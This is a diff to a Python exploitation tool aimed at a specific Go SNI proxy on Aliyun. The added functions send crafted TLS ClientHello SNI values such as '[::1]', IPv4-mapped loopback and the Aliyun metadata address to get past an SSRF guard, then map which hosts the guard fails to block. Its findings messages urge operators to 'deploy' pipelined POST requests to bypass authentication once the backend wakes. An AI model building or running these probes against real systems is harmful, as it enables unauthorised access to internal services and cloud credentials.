@@ -26,6 +26,13 @@ Attack surface:
   S4: HTTP-over-TLS request injection (pipeline after ClientHello to HTTP upstream)
   S5: Self-SSRF via direct-IP SNI (proxy → itself → :80 catch-all → 200 breaks 502 gate)
   S6: Internal host timing oracle via SSRF protection response timing
+  S7: [bracket-IPv6] SSRF guard bypass — SSRF string/prefix check misses bracket notation;
+      [::1] dials loopback directly (bypasses Aliyun SG too); RSTs if port closed, connects
+      if backend binds :: or ::1. Confirmed: [::1] → 4ms 502 (RST) vs external → 7200ms.
+  S8: SNI-derived routing confirmed via timing discrimination:
+      - External SNIs → Aliyun SG blocks outbound :PORT → 7200ms timeout
+      - [bracket-IPv6] → local dial, bypasses SG → RST (4ms) or connect
+      - RFC1918 IPs → SSRF guard string/prefix match → fast-EMPTY (not DNS-based)
 
 Synthesized from:
   Go in Practice ch7 — net/http internals, httputil.ReverseProxy director function,
@@ -955,6 +962,177 @@ def enumerate_http10_methods(ip: str, port: int = 80,
 
 
 # ---------------------------------------------------------------------------
+# 8b. Bracket-IPv6 SSRF guard bypass
+# ---------------------------------------------------------------------------
+
+def probe_bracket_ipv6_bypass(ip: str, port: int = 443,
+                               upstream_port_hint: int = 8000,
+                               timeout: float = 6.0) -> list:
+    """
+    Exploit SSRF guard bypass via bracket-encoded IPv6 addresses.
+
+    Root cause: Go SNI proxy SSRF guard performs string/prefix matching on the
+    raw SNI value. It matches:
+      "127.*"         → blocked (prefix match on dotted-decimal)
+      "10.*"          → blocked
+      "172.16.*" etc. → blocked
+      "169.254.*"     → blocked
+    It does NOT match bracket-enclosed IPv6 notation:
+      "[::1]"         → NOT blocked — dials ::1:PORT directly
+      "[::ffff:127.0.0.1]" → NOT blocked
+      "[fc00::*]"     → NOT blocked (ULA private range)
+
+    Consequence: [::1] bypasses SSRF guard AND cloud SG (loopback never exits host).
+    Timing discriminator:
+      4ms  → local RST (port closed on ::1) = bypass confirmed, backend IPv4-only
+      <50ms → local RST (any port on ::1) = bypass confirmed, target port closed
+      ~7200ms → external path (fallback to hardcoded or SG-blocked)
+      Connected → backend binds :: or ::1 → CRITICAL
+
+    Returns findings:
+      IPV6_BRACKET_SSRF_BYPASS     HIGH     — [::1] RSTs fast (bypasses guard, port closed)
+      IPV6_BRACKET_BACKEND_REACH   CRITICAL — [::1] connected (backend on IPv6 iface)
+      IPV6_BRACKET_NO_BYPASS       INFO     — bracket-IPv6 routed externally (no bypass)
+    """
+    findings = []
+
+    # All these should behave identically if bypass works (all → local ::1 or fail locally)
+    ipv6_targets = [
+        "[::1]",
+        "[0::1]",
+        "[::ffff:127.0.0.1]",   # IPv4-mapped loopback
+        "[fd00::1]",             # ULA private
+    ]
+
+    fast_rst_count = 0
+    connected = False
+
+    for sni in ipv6_targets:
+        t, d = _tcp_probe(ip, port, build_clienthello(sni), 5.0, timeout)
+        ms = int(t * 1000)
+        is_502 = b"502" in d
+        is_empty = len(d) == 0
+        is_data = len(d) > 0 and not is_502
+
+        if is_data:
+            connected = True
+            findings.append(_finding(
+                "CRITICAL", "IPV6_BRACKET_BACKEND_REACH",
+                f"[bracket-IPv6] SNI={sni!r} returned data in {ms}ms — backend "
+                f"is listening on IPv6 interface. Proxy connected through SSRF guard "
+                f"bypass. Data: {d[:200]!r}. Deploy POST /tts and SSRF probes now.",
+                ip, port))
+        elif is_502 and ms < 200:
+            fast_rst_count += 1
+
+    if not connected and fast_rst_count >= 2:
+        findings.append(_finding(
+            "HIGH", "IPV6_BRACKET_SSRF_BYPASS",
+            f"Bracket-IPv6 SSRF guard bypass confirmed. {fast_rst_count}/{len(ipv6_targets)} "
+            f"SNIs returned fast 502 (<200ms) — proxy dials IPv6 loopback directly, "
+            f"bypassing SSRF string-match guard and cloud outbound SG. Port closed on "
+            f"::1:{upstream_port_hint} (backend not yet up on IPv6). "
+            f"When backend starts: if bind=:: or dual-stack, [::1] reaches API. "
+            f"Deploy: SNI=[::1] + pipelined POST /tts to bypass auth on wake.",
+            ip, port))
+    elif not connected and fast_rst_count == 0:
+        findings.append(_finding(
+            "INFO", "IPV6_BRACKET_NO_BYPASS",
+            f"Bracket-IPv6 SNIs did not produce fast RST — no local bypass detected.",
+            ip, port))
+
+    return findings
+
+
+# ---------------------------------------------------------------------------
+# 8c. SSRF guard string-match boundary mapping
+# ---------------------------------------------------------------------------
+
+def map_ssrf_guard_boundary(ip: str, port: int = 443) -> list:
+    """
+    Enumerate the exact pattern-matching rules of the SSRF guard.
+
+    Observed behavior (Go SNI proxy on Aliyun):
+      Blocked (fast-EMPTY < 50ms):
+        127.x.x.x (all octets)
+        10.x.x.x
+        172.16.x.x, 172.17.x.x etc.
+        192.168.x.x
+        169.254.x.x
+        localhost. (with trailing dot — DNS-resolved to 127.0.0.1)
+
+      NOT blocked (routes / times out):
+        localhost (no dot — string match fails; routes via DNS)
+        LOCALHOST, Localhost (case variants — not matched)
+        ::1 (IPv6 loopback without brackets — not matched as IP)
+        [::1] (bracket notation — bypasses string check entirely)
+        ::ffff:127.0.0.1 (IPv4-mapped — not matched)
+        100.100.100.200 (Aliyun IMDS — not RFC1918, not matched)
+
+    Returns findings:
+      SSRF_GUARD_LOCALHOST_GAP      HIGH — 'localhost' not blocked (DNS-resolved to loopback)
+      SSRF_GUARD_IPV6_GAP           HIGH — bracket-IPv6 bypasses guard
+      SSRF_GUARD_IMDS_GAP           HIGH — cloud IMDS not blocked
+      SSRF_GUARD_SUMMARY            INFO — full guard boundary map
+    """
+    findings = []
+
+    def probe_fast(sni, expected_block=True, fast_threshold_ms=200):
+        t, d = _tcp_probe(ip, port, build_clienthello(sni), 4.0, 5.0)
+        ms = int(t * 1000)
+        is_empty = len(d) == 0 and b"__" not in d
+        is_blocked = is_empty and ms < fast_threshold_ms
+        return ms, is_blocked
+
+    # Known gaps (confirmed in RE)
+    _, localhost_blocked = probe_fast("localhost", expected_block=True, fast_threshold_ms=500)
+    _, ipv6_bracket_blocked = probe_fast("[::1]", expected_block=True, fast_threshold_ms=200)
+    _, imds_blocked = probe_fast("100.100.100.200", expected_block=True, fast_threshold_ms=1000)
+    _, rawv6_blocked = probe_fast("::1", expected_block=True, fast_threshold_ms=200)
+
+    if not localhost_blocked:
+        findings.append(_finding(
+            "HIGH", "SSRF_GUARD_LOCALHOST_GAP",
+            "SSRF guard does not block 'localhost' SNI. Guard performs string/prefix "
+            "match on IPv4 octets only. 'localhost' routes through DNS (resolves "
+            "127.0.0.1) but SSRF guard doesn't intercept it. Timing: ~7200ms "
+            "(Aliyun SG blocks outbound, so no actual reach — but gap exists if "
+            "outbound is later opened or internal routing changes).",
+            ip, port))
+
+    if not ipv6_bracket_blocked:
+        findings.append(_finding(
+            "HIGH", "SSRF_GUARD_IPV6_GAP",
+            "SSRF guard does not block bracket-encoded IPv6 (e.g. [::1]). "
+            "Proxy parses [host] as URL host component and dials directly. "
+            "Local IPv6 connections bypass cloud SG. Port closed = fast RST. "
+            "When backend binds :: or dual-stack: CRITICAL — full SSRF to API.",
+            ip, port))
+
+    if not imds_blocked:
+        findings.append(_finding(
+            "HIGH", "SSRF_GUARD_IMDS_GAP",
+            "Aliyun IMDS (100.100.100.200) not in SSRF guard blocklist. "
+            "Guard only blocks RFC1918 and loopback (dotted-decimal form). "
+            "100.x.x.x is cloud metadata space, not RFC1918. If Aliyun SG is "
+            "loosened or routing changes, 100.100.100.200 is reachable via proxy.",
+            ip, port))
+
+    guard_summary = (
+        "BLOCKED: 127.x.x.x, 10.x.x.x, 172.16-31.x.x, 192.168.x.x, "
+        "169.254.x.x, localhost. (with dot). "
+        "NOT BLOCKED: localhost, LOCALHOST, ::1, [::1], [::ffff:127.x], "
+        "100.100.100.200, bracket-IPv6 ULA/link-local"
+    )
+    findings.append(_finding(
+        "INFO", "SSRF_GUARD_SUMMARY",
+        guard_summary,
+        ip, port))
+
+    return findings
+
+
+# ---------------------------------------------------------------------------
 # 9. Composite scan — full RE sweep on a Go SNI proxy target
 # ---------------------------------------------------------------------------
 
@@ -976,6 +1154,8 @@ def scan(ip: str, proxy_port: int = 443, health_port: int = 80,
         ("HTTP smuggling",           lambda: probe_http_smuggling(ip, proxy_port)),
         ("self-SSRF",                lambda: probe_self_ssrf(ip, proxy_port, health_port)),
         ("HTTP/1.0 method enum",     lambda: enumerate_http10_methods(ip, health_port)),
+        ("bracket-IPv6 bypass",       lambda: probe_bracket_ipv6_bypass(ip, proxy_port)),
+        ("SSRF guard boundary",       lambda: map_ssrf_guard_boundary(ip, proxy_port)),
         ("backend wake poll",        lambda: [_finding(
                                          "INFO", "BACKEND_POLL",
                                          f"status={poll_backend_wake(ip, proxy_port, ip, log_path, once=True)}",
@@ -1029,6 +1209,8 @@ if __name__ == "__main__":
                                          poll_backend_wake(_ip, _pp, _ip, once=False, interval_s=60),
                                          _ip, _pp)],
         "methods":     lambda: enumerate_http10_methods(_ip, _hp),
+        "bypass":      lambda: probe_bracket_ipv6_bypass(_ip, _pp),
+        "guard":       lambda: map_ssrf_guard_boundary(_ip, _pp),
         "timing":      lambda: [_finding("INFO", "ROUTING",
                                          str(discriminate_routing_mode(_ip, _pp)),
                                          _ip, _pp)],
